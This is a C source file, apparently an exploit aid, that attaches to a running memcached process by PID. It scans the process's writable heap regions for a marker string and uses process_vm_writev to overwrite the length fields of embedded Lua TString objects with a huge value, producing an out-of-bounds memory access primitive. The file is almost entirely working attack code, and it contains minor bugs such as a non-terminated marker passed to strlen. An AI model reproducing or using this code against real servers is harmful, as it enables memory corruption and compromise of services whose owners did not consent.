#include <sys/types.h>
#include <sys/uio.h>
#include <linux/limits.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <inttypes.h>
#include <string.h>

/* never skip leg day */
void hexdump(void *ptr, int buflen) {
  unsigned char *buf = (unsigned char*)ptr;
  int i, j;
  for (i=0; i<buflen; i+=16) {
    printf("%06x: ", i);
    for (j=0; j<16; j++) 
      if (i+j < buflen)
        printf("%02x ", buf[i+j]);
      else
        printf("   ");
    printf(" ");
    for (j=0; j<16; j++) 
      if (i+j < buflen)
        printf("%c", isprint(buf[i+j]) ? buf[i+j] : '.');
    printf("\n");
  }
}

/* find and return the first instance of our special string in the heap */
size_t modify_tstring_lens(pid_t pid, size_t address_start, size_t address_end)
{
  int BLOCKSIZE = 4096;
  char SPECIAL[10] = {0x43, 0x41, 0x46, 0x45, 0x42, 0x41, 0x42, 0x45, 0x41, 0x41}; // "CAFEBABE" + string.rep("A",33)
  char buf[BLOCKSIZE];
  struct iovec local[1];
  struct iovec remote[1];
  size_t nread = 0, nwrite = 0, curraddr = 0, foundstr = 0;

  // we read 4096 bytes per attempt
  local[0].iov_len = BLOCKSIZE;
  remote[0].iov_len = BLOCKSIZE;

  for(curraddr = address_start; curraddr < address_end; curraddr += BLOCKSIZE)
  {
    local[0].iov_base = buf;
    remote[0].iov_base = curraddr; //+ (sizeof(int) * 6);

    nread = process_vm_readv(pid, local, 1, remote, 1, 0);
    if(nread < 0){
      printf("[-] Error reading memory: %s\n",strerror(errno)); 
      return -1;
    }

    // search for pattern; this could probably be more efficient! 
    for(size_t i = 0; i <= nread - strlen(SPECIAL); i++){
      if(memcmp(buf + i, SPECIAL, strlen(SPECIAL)) == 0){
        // found
        foundstr = (curraddr + i - (sizeof(int)*6));
        //hexdump((buf+i)-10, strlen(SPECIAL)+15);
        printf("[!] Modifying TString length @ %llx\n", foundstr);
        modify_tstring(pid, foundstr);
      }
    }

    memset(buf, 0x0, BLOCKSIZE);
  }

  return 0;
}

/*
typedef struct TString {
  CommonHeader;
  lu_byte extra;  // reserved words for short strings; "has hash" for longs 
  ls_byte shrlen;  /* length for short strings, negative for long strings 
  unsigned int hash;
  union {
    size_t lnglen;  /* length for long strings 
    struct TString *hnext;  /* linked list for hash table 
  } u;
  char *contents;  /* pointer to content in long strings 
  lua_Alloc falloc;  /* deallocation function for external strings 
  void *ud;  /* user data for external strings 
} TString;
 */
 /* given an address of a TString, update the obj length */
int modify_tstring(pid_t pid, size_t address)
{
  size_t nwrite = 0;
  char MAXLEN[16] = {0xff,0xff,0xff,0x7f,0x00,0x0,0x0,0x0};
  struct iovec local[1];
  struct iovec remote[1];

  // update length
  local[0].iov_base = MAXLEN;
  local[0].iov_len = 16;
  remote[0].iov_base = address + (sizeof(int) * 4);
  remote[0].iov_len = 16;

  nwrite = process_vm_writev(pid, local, 1, remote, 1, 0);
  if(nwrite <= 0) {
    printf("[-] Failed to update lnglen: %s\n", strerror(errno));
    return -1;
  }

  return 0;
}

int main(int argc, char **argv)
{
  char maps[512];
  char buf[PATH_MAX];
  char perms[5];
  pid_t pid = 0;
  size_t start_addr = 0, end_addr = 0, inode = 0;
  FILE *fMaps;

  // parse argv
  if(argc <= 1){
    printf("[-] %s: <memcached pid>\n", argv[0]);
    return -1;
  }

  pid = (pid_t)strtol(argv[1], NULL, 10);

  sprintf(maps, "/proc/%d/maps", pid);

  fMaps = fopen(maps, "r");
  if(!fMaps){
    printf("[-] couldn't find PID %d! (is it running?)\n", pid);
    return -1;
  }

  // iterate over memcached mem maps and locate those that match our criteria (dynamic and rw)
  while(fgets(buf, PATH_MAX, fMaps) != NULL){
    sscanf(buf, "%lx-%lx %4s %*x %*s %lu", &start_addr, &end_addr, perms, &inode);

    if(strchr(perms, 'r') && strchr(perms, 'w') && inode == 0){
      //printf("%llx - %llx matches\n", start_addr, end_addr);

      // search region for TString's and smash their length    
      modify_tstring_lens(pid, start_addr, end_addr);
    }
  }

  printf("[!] All TStrings modified\n");
  return 0;
}
